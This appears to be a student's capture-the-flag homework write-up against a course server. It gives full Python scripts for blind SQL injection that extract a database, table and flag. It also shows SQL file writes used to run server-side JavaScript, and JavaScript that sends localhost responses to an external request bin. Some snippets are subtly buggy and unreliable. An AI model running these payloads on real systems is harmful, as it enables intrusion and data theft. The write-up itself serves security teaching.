---
title: "HW5B"
math: true
unlisted: true
---

# Homework 5B Writeup

### vow vs gldanoob

> I don’t like JS. -vow

# Part 0: Networking

![Untitled](/hw5b/Untitled.png)

So we arrived at the /flag page after attending the lessons (~~and copying the flags~~).

We see there is a place for us to “Run Admin Script”, and some random links leading to a JS tutorial and some subpar memes.

How about we check the network?

![Untitled](</hw5b/Untitled 1.png>)

~~ew more js.~~   Let’s filter out the JavaScript.

![Untitled](</hw5b/Untitled 2.png>)

We see that there is “ok” and “isolated-first.jst”. “ok” looks a bit weird ~~sus~~ so let’s take a look:

![Untitled](</hw5b/Untitled 3.png>)

And here we got our exercise flag!

# Part 1: 2633ms

Notice that the payload format for “ok” looks very familiar to SQL queries. Perhaps this is a possible endpoint?

Also if you recall when completing the exercise flag: 

![Untitled](</hw5b/Untitled 4.png>)

There is a column named “lastOk” in the “users” table. Perhaps this is used to check whether your SQL query from the “ok” endpoint works or not?

### How about try sending a SQL query through the endpoint?

(We can use Burp/FireFox/Python to send the payload, if anyone knows how to do it with Chrome please @ me, in our case we use Python with the requests module because snake good.)

```python
import requests

# Since the "ok" endpoint is in /flag, that basically means 
# we need credentials in order to be able to send requests.

#yum
cookies = {
            'next-auth.csrf-token': 'Fill it in yourself.'
            'next-auth.callback-url': 'Fill it in yourself.'
            'next-auth.session-token': 'Fill it in yourself.',
	       }

#https requests headers
headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
        }

# Simple function to get "lastOk" time before sending any SQL queries.
def get_last_ok():

		# Notice that "users" also has an API endpoint, we can basically send SQL requests
		# directly to /api/users to get data from the table, which is the same as doing it 
		# on the web. You can check the format again using Networking on your browser.
    user_res = requests.post('http://chal.firebird.sh:35020/api/users', cookies=cookies, headers=headers, data=data_for_users)
    
		# Parsing json
		user_res = user_res.json()
    current_time = user_res['tables'][0][0]['lastOk']
    return current_time

last_ok = get_last_ok()

# \' is used to treat ' as a string, instead of closing the brackets.
sql_for_flag = '{"ok": "SELECT \'femboys\'"}'

# SQL for getting just your account's "lastOk". 
# Replace the id with your account id.
sql_for_users = '{"query":"\'\' or id = 6969 #"}'

flag_response = requests.post('http://chal.firebird.sh:35020/api/ok', cookies=cookies, headers=headers , data=data)
user_response = requests.post('http://chal.firebird.sh:35020/api/users', cookies=cookies, headers=headers , data=data_for_users)
user_response = user_response.json()
new_ok = user_response['tables'][0][0]['lastOk']

# Checking whether the "lastOk" time was updated or not.
if new_ok != last_ok:
	print("El Psy Congroo.")
```

Explanation: We are sending a SQL query through the /api/ok endpoint and see whether “lastOk” updates. The query we are using is:

`SELECT ‘some_random_string’`

In theory, this would output something like this:

![Untitled](</hw5b/Untitled 5.png>)

This allows our query to output something even if we don’t know any of the tables’ names. The only way this would not work is:

1. Like exercise flag, we have to do UNION injection, hence the number of columns may be wrong.
2. We are injecting into a SQL query.
3. The api/ok endpoint does not process SQL queries.

Running the code, the console prints “El Psy Congroo.” And if we change our payload to gibberish, nothing is printed. This confirms our theory that /api/ok takes SQL queries. (Can also verify by checking the Networking and see if you receive “Internal Server Error”)

### Now here’s the question: Is the database/session accessed through /api/ok the same as the one in /users?

Well, we can just change our payload to `SELECT * FROM users` , and we can see that lastOk did not update. Therefore, /api/ok leads to a new database/session, and there is probably a flag in a table that we don’t know the name of, nor its column names.

But here is a problem: We only know whether our SQL query **runs or not**, we currently have no method of knowing what the SQL query **outputs**.

### Can we make a payload that allows us to find out what the SQL query outputs? Yes, and that is called BlindSQLi.

Different database have different commands, and since this challenge uses MySQL, it also has some of its own commands. One of which is `DATABASE();` , which returns the database name. **Can we try to get the name of the database using the command?**

Assuming that the database name has 16 characters and only consists of small alphabets, if we were to guess the name randomly, we would have:

$$
26^{16} \text{ different combinations}
$$

Not ideal.

But what is there is a way for us to guess each letter individually? Then we would only need to go through:

$$
26*16=416 \text{ tries}
$$

And that good news is that we can do exactly that.

We know that in SQL `1=1` evaluates to true, but did you know we can do the same with characters?

```
# ascii is like Python's ord() but for SQL
SELECT username FROM users WHERE username = 'uwu' or ascii('A') = 65
SELECT username FROM users WHERE username = 'owo' or 'A' = 'A'
```

Both of these queries will output all usernames, since the logic becomes:

 `username = 'something' or True`

Next, how do we go through each character individually? Since `DATABASE();` will output the full name. If the database name is “UwU”, then we would just be doing this:

`“UwU” = “insert_a_single_character”`

Which will always be false. Luckily, SQL has a function called `substring();` , and it works like this:

```
# Substring takes in 3 arguments:
# the string, 
# the starting position (first character is 1)
# and how many characters you want (including starting position)
SELECT SUBSTRING("UST has no femboys", 1, 3) AS ExtractedText;

# This will output a table like:
# ExtractedText
# ===============
# UST
```

Now our final problem, how do we know whether there is an output? LastOk is an indicator for whether your SQL query has successfully ran, but it does not tell us anything about whether the query returns something or nothing. It would be nice if there was something like a if-else statement for SQL. **(>ᴗ•) !**

Introducing SQL `CASE` expression!

Wooooooooooooooahhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh!

![spy-x-family-spy-family.gif](/hw5b/spy-x-family-spy-family.gif)

Essentially, the case expression can act as an if-else statement, and we can create a payload that tells us whether a character matches or not. If it matches, update lastOk, if not, we can use error-based SQL injection so that the SQL query cannot be processed, hence not updating lastOk even if we pass in a correct query.

### **Therefore, if we wanted to find the first letter of the database name, our query would be:**

`SELECT CASE WHEN ascii((substring(DATABASE(), 1, 1))) = ' + random_character_integer_value + ' THEN \'lol\' ELSE exp(1000) END`

Explanation: Assume that the database name is “UwU”, if the first character’s integer value is equal to the one we want to check, our statement will become:

`SELECT ‘lol’`

Which will run and update lastOk, otherwise it becomes:

`SELECT exp(1000)`

Which equals to $e^{1000}$, and it will cause an overflow error, hence the SQL query will not successfully run, and lastOk will not be updated.

Now, let’s edit the script, automate it and find the database name:

```python
import requests

cookies = {
            'next-auth.csrf-token': 'Fill it in yourself.'
            'next-auth.callback-url': 'Fill it in yourself.'
            'next-auth.session-token': 'Fill it in yourself.',
	       }

headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
        }

def get_last_ok():
    user_res = requests.post('http://chal.firebird.sh:35020/api/users', cookies=cookies, headers=headers, data=data_for_users)
		user_res = user_res.json()
    current_time = user_res['tables'][0][0]['lastOk']
    return current_time

# Usually user created databased are all lower case.
character_list = '{_$@.-/}abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
sql_for_users = '{"query":"\'\' or id = 6969 #"}'

# If this reaches the length of our character_list, that either means we are done or
# the code is messed up :(
terminate_counter = 0 
letter_position = 1
last_ok = get_last_ok()
database_name = ""

while (terminate_counter != len(character_list)):
	terminate_counter = 0
	for char in character_list:
		char_num = ord(char)
		sql_for_flag = '{"ok":"SELECT CASE WHEN ascii((substring(DATABASE(), ' + str(letter_position) + ', 1))) = ' + str(char_num) + ' THEN \'lol\' ELSE exp(1000) END"}'
		flag_response = requests.post('http://chal.firebird.sh:35020/api/ok', cookies=cookies, headers=headers , data=sql_for_flag)
		user_response = requests.post('http://chal.firebird.sh:35020/api/users', cookies=cookies, headers=headers , data=data_for_users)
		user_response = user_response.json()
		new_ok = user_response['tables'][0][0]['lastOk']
		
		if new_ok != last_ok:
			letter_position += 1
			database_name += char
			last_ok = new_ok # Update the time
			print(database_name)
			break
		else:
			terminate_counter += 1
print("Done!")
```

After a while, we would get “**firebird**”, and that is our database name.

Now, if we want to find the table name, we can reuse our payload and make some modifications:

```sql
SELECT CASE WHEN EXISTS(SELECT table_name, table_schema FROM INFORMATION_SCHEMA.TABLES WHERE table_name LIKE \'' + database_name + char + '%\' AND table_schema = (\'firebird\')) THEN \'lol\' ELSE exp(1000) END
```

Explanation: As we know, all the table names are stored in `INFORMATION_SCHEMA.TABLES`, however it also contains lots of predefined tables, which will heavily affect our search process. To filter out those tables, we can add `table_schema` column and look for tables that have `table_schema = firebird` (that is why we need to find the database name first).

Since we don’t know the exact table name, we would have to use the `LIKE` expression. `LIKE` can search for a specified pattern in a column. For example, if you want to find all tables that start with “UwU”, you could do `table_name = ‘UwU%’`.

Lastly, we use the `EXISTS` expression. If the query returns nothing, then `EXISTS` will return false, otherwise it will return true.

Again, let’s modify our code and run the script:

```python
# Remember to copy the code above in previous code blocks.
# Not writing it here to save space.

terminate_counter = 0 
letter_position = 1
last_ok = get_last_ok()
database_name = ""

while (terminate_counter != len(character_list)):
	terminate_counter = 0
	for char in character_list:
		char_num = ord(char)
		sql_for_flag = '{"ok":"SELECT CASE WHEN EXISTS(SELECT table_name, table_schema FROM INFORMATION_SCHEMA.TABLES WHERE table_name LIKE \'' + database_name + char + '%\' AND table_schema = (\'firebird\')) THEN \'lol\' ELSE exp(1000) END"}'
		flag_response = requests.post('http://chal.firebird.sh:35020/api/ok', cookies=cookies, headers=headers , data=sql_for_flag)
		user_response = requests.post('http://chal.firebird.sh:35020/api/users', cookies=cookies, headers=headers , data=data_for_users)
		user_response = user_response.json()
		new_ok = user_response['tables'][0][0]['lastOk']
		if new_ok != last_ok:
			letter_position += 1
			database_name += char
			last_ok = new_ok
			print(database_name)
			break
		else:
			terminate_counter += 1
print("Done!")
```

### If you run this script, you will realize that the console outputs nothing. Why?

### It turns out the CTF author decided to ban the keyword `WHERE` and `LIMIT`.

![rty.JPG](/hw5b/rty.jpg)

If we cannot use `WHERE`, are there any other alternatives?

If you Google (and try harder) enough, you will find out there is something called `HAVING`, which can act as a replacement for WHERE. Now our payload becomes:

`SELECT CASE WHEN EXISTS(SELECT table_name, table_schema FROM INFORMATION_SCHEMA.TABLES HAVING table_name LIKE \'' + database_name + char + '%\' AND table_schema = (\'firebird\')) THEN \'lol\' ELSE exp(1000) END`

Edit the script, and it should give the output after a while. In the meantime here is a GIF while the script runs.

[https://tenor.com/view/anime-meme-dance-round-and-round-spin-gif-15060591](https://tenor.com/view/anime-meme-dance-round-and-round-spin-gif-15060591)

After some time, you should get the name of the table, which is “**homework**”.

### Question: What happens if there are multiple tables created by the user?

Answer: Try out all the letters. :( 

After getting the table name, we find the column name using something similar. The payload would be:

`SELECT CASE WHEN EXISTS(SELECT column_name, table_name FROM INFORMATION_SCHEMA.COLUMNS HAVING column_name LIKE \'' + database_name + char + '%\' AND table_name IN (\'homework\')) THEN \'lol\' ELSE exp(1000) END`

Same idea, we are trying to find column names for the table “homework”.

### While you are running the script, here are some bonus questions:

================================================================

### **Bonus 1: Can we determine the number of rows a table has without knowing the column name?**

Answer 1: Yes, SQL has a function called count() and we can write a query like:

`SELECT count(*) FROM homework`

Which outputs the number of rows.

================================================================

### Bonus 2: Can we determine the number of columns a table has without knowing the column name?

Answer 2: No. (if yes big big plz tell)

================================================================

After another n minutes, you would get the only column name, which is “**flag**”.

Now, we want to print out the flag, we can again reuse the payload for finding the database name and modify it to (this only checks the first letter):

`SELECT CASE WHEN ascii((substring((SELECT flag FROM homework), 1, 1))) = ' + random_character_integer_value + ' THEN \'lol\' ELSE exp(1000) END`

================================================================

Now run your solve script, here is a final GIF (for 5-bi at least) while you wait:

[https://tenor.com/view/frieren-anime-warm-sousou-no-frieren-frieren-beyond-journey’s-end-gif-10978754497646408177](https://tenor.com/view/frieren-anime-warm-sousou-no-frieren-frieren-beyond-journey’s-end-gif-10978754497646408177)

### And now after all that, we get our flag:

### flag{ar3_y0u_ok4y_h3ll0_3q}

================================================================

### Bonus 3: Is there a faster searching method?

Answer 4: You can probably write a binary search using > or < instead of just comparing it to each letter, but searching for each character would probably be easier to implement. (maybe?

================================================================

# Part 2: The power of code

Did you remember the weird looking “Run admin script” text field when you first logged in? Since it hasn’t been in good use previously, perhaps it’s related to the second part of the homework. Let’s try putting something into it:

![Untitled](</hw5b/Untitled 6.png>)

One thing we could tell from this output, is that the creator of this challenge is a pathetic weeb. 

![Untitled](</hw5b/Untitled 7.png>)

****coughs****

Let’s try some common LFI payloads: 

![Untitled](</hw5b/Untitled 8.png>)

…still nothing. The network tab should at least tell us something about it:

![Untitled](</hw5b/Untitled 9.png>)

there we go. Using `/` or  `..` in the payload gives us this error, but otherwise we just sees the `success: true` JSON response. Since that looks suspiciously intentional, it suggests the challenge is indeed about bypassing the LFI filter, allowing us to run arbitrary scripts.

How about we manually edit the request JSON body?

![Untitled](</hw5b/Untitled 10.png>)

If you need to have the `success: true` response (and perhaps start executing the script), the body must be a JSON object with the `fileName` property. There’s nothing we can do other than to specify the file name of a script.

## SQL is so powerful… for exploits

Let’s take a step back… are there any other API endpoints we can use?

![Untitled](</hw5b/Untitled 11.png>)

Isn’t this what we used to solve the previous part? Let’s see what else SQLi is capable of…

![Untitled](</hw5b/Untitled 12.png>)

![Untitled](</hw5b/Untitled 13.png>)

Ayo that’s a really handy **arbitrary file write** exploit**.** If we can inject JS scripts into files of our own free will, we can use the `/api/execute` endpoint to make the server execute it.

After some debugging and even more googling, we used a Python (not JS sorry) script to automate the task:

```python
code = 'console.log("hi")'
hex_code = code.encode().hex()

fname = str(random.randrange(0, 10000000))
print(fname)

data = {"ok": "SELECT 0x" + hex_code +
        f" INTO OUTFILE '/var/lib/mysql-files/{fname}.js'"}
print(data)

response = requests.post('http://chal.firebird.sh:35020/api/ok',
                         cookies=cookies, headers=headers, data=json.dumps(data))
print(response.json())

data = {"fileName": f"{fname}.js"}
response = requests.post('http://chal.firebird.sh:35020/api/execute',
                         cookies=cookies, headers=headers, data=json.dumps(data))
print(response.json())
```

Upon running the script, the target code gets encoded into hex, becomes the constant column name of the SQL query, and the request was sent to the server. Consuming `/api/execute` allows us to execute our code under the same file name.

Now, how do we actually see the output? (Spoiler: we can’t. Try harder)

There’s something called a timing attack, in which we analyze the time taken, in this case, for the server to response. For example, let’s pass an infinite loop to the server:

```python
code = 'while (true) { console.log("hi"); }'
```

![Untitled](</hw5b/Untitled 14.png>)

That took more than 20 seconds, which entails our script probably worked.

Ouch, the creator just pinged us on Discord. Sorry I didn't meant to blow up your server…

What else did the creator say about the challenge?

![Untitled](</hw5b/Untitled 15.png>)

Hm. We have to make a request to run a script *making another request*? Oh, apparently the creator just hinted us a way we can retrieve the output of the JS code.

Let’s take a look at the website the creator showed us:

![Untitled](</hw5b/Untitled 16.png>)

It is also mentioned that we should use something like Pipedream to capture requests, so let’s try to set up a Pipedream request bin, and try to send a request using the `HTTP` module. Our JavaScript payload would be:

```jsx
var https = require('https');

// Used to configure your HTTP request.
const options = {
			// Your Pipedream request bin link.
      hostname: "woahthisisverycool.m.pipedream.net",
			// Not really needed but ok.
      path: "/vowbecomefemboy",
      method: "POST"
}

// Make request.
const req = https.request(options)
req.end()
```

Bonus: You can use [https://www.toptal.com/developers/javascript-minifier](https://www.toptal.com/developers/javascript-minifier) to simplify your JavaScript into one line, which could be helpful (maybe?

If we run this, we realize that nothing happened.

![image.png](/hw5b/image.png)

(Image of a poor, sad, empty Requestbin.)

Would it be possible that the container have some pre-installed modules? Let’s try to not require `https` and see what happens:

```jsx
const options = {
      hostname: "woahthisisverycool.m.pipedream.net",
      path: "/vowbecomefemboy",
      method: "POST"
}

const req = https.request(options)
req.end()
```

This time, it works! 

![Untitled](</hw5b/Untitled 17.png>)

So seems like some modules are already pre-installed, and we don’t (can’t) install our own modules. Let’s check what modules are there by first getting the list of modules, then sending it back as data:

```jsx
const data = JSON.stringify({
  "ok": Object.keys(this)
})

const options = {
      hostname: "woahthisisverycool.m.pipedream.net",
      path: "/vowbecomefemboy",
      method: "POST"
}

const req = https.request(options)
req.write(data)
req.end()
```

![Untitled](</hw5b/Untitled 18.png>)

Ok, seems like only `http` and `https` are installed. (Prior to this, gldanoob used `fetch` and found out there are 4 modules installed, with one being `fetch`, ~~CTF author modify solution bad bad~~.)

Now we can send data back to our Requestbin, but the problem is where should we get our data (flag) from? Since we can now run JavaScript on server side, let’s try accessing the website using `localhost`!

But what is the port for `localhost`? As given in Hint 2, this server uses Svelte and Node.js, so after some Googling, the possible ports could be 3000, 4173 or 5173. (It is recommended to refer to the official documentation since Reddit lied to me about port being 5000 and 8080)

After some testing (and crashing the server because you picked the wrong port), you will find out that only **port 5173** did not crash, so this should be the correct port. (~~or just wrench author probably more easier~~)

Now, let’s try to send the login page back to our Requestbin:

```jsx
// Send GET request to the login page.
const options1 = {
  hostname: "localhost",
  port: 5173,
  path: "/",
  method: "GET",
  headers: {
    "Content-Type": "application/json",
    "Cookie": "Add your own Cookies."
  },
}

// Get the response body and put it into different variables.
const req1 = http.request(options1, function(res) {
  var status_code = res.statusCode;
  var heading = JSON.stringify(res.headers)
  res.on("data", function(chunk) {
    var lol = chunk.toString();

		// Pack variables into data.
    const data = JSON.stringify({
      "status_code": status_code,
      "heading": heading,
      "data": lol
    })

    const options2 = {
      hostname: "Add your own Requestbin link.",
      path: "/vowbecomefemboy",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
    }
		
		// Send to Requestbin
    const req = https.request(options2)
    req2.write(data)
    req2.end()

  });
})
req1.end()
```

![Untitled](</hw5b/Untitled 19.png>)

There we go, we just got the HTML for the login page!

But where is the flag?

I guess you just have to test out different endpoints.

[https://tenor.com/view/aqua-aaaaa-cry-help-anime-gif-24539456](https://tenor.com/view/aqua-aaaaa-cry-help-anime-gif-24539456)

(me when i can’t find the endpoint)

-vow

After trying out different endpoints, you realize that something is slightly different when you POST data to the /api/ok endpoint:

```jsx
// Sending random SQL query to /api/ok
const data1 = JSON.stringify({
  "ok": "SELECT *",
})

const options1 = {
  hostname: "localhost",
  port: 5173,
  path: "/api/ok",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Cookie": "Add your own Cookies."
  },
}

// Get the response body and put it into different variables.
const req1 = http.request(options1, function(res) {
  var status_code = res.statusCode;
  var heading = JSON.stringify(res.headers)
  res.on("data", function(chunk) {
    var lol = chunk.toString();

		// Pack variables into data.
    const data2 = JSON.stringify({
      "status_code": status_code,
      "heading": heading,
      "data": lol
    })

    const options2 = {
      hostname: "Add your own Requestbin link.",
      path: "/vowbecomefemboy",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
    }
		
		// Send to Requestbin
    const req = https.request(options2)
    req2.write(data2)
    req2.end()

  });
})
req1.write(data1)
req1.end()
```

![Untitled](</hw5b/Untitled 20.png>)

Before when completing Part 1, you would not receive the error of your SQL query, but when you access the endpoint /api/ok, you now do. So this should be the endpoint we are looking for.

Now if we modify our SQL payload a bit:

```jsx
const data1 = JSON.stringify({
  "ok": "SELECT table_name FROM INFORMATION_SCHEMA.tables",
})
```

![Untitled](</hw5b/Untitled 21.png>)

We see that there is a table that looks like it is user created. And if we access it:

```jsx
const data1 = JSON.stringify({
  "ok": "SELECT * FROM ikuyo",
})
```

![Untitled](</hw5b/Untitled 22.png>)

### We now have our last flag for Track B Week 5:

### flag{fuw4_fuw4_pur3_pur3_m1r4c13}

================================================================

### Bonus: Gldanoob wrote a proxy to the server so that we can just access the server through the browser without sending so many requests.

[https://gea.gldanoob.repl.co/proxy?url=chal.firebird.sh:35020](https://gea.gldanoob.repl.co/proxy?url=chal.firebird.sh:35020)

================================================================

In conclusion, try harder.

(~~or just beat the author up that works too.~~)